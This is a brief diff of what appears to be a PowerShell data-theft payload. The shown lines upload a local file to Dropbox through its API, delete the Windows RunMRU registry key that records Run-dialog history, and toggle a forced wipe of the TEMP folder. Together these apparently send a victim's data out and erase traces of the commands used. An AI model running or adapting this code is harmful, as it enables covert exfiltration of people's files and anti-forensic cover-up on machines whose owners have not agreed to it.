@@ -46,7 +46,7 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 
 
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+# rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
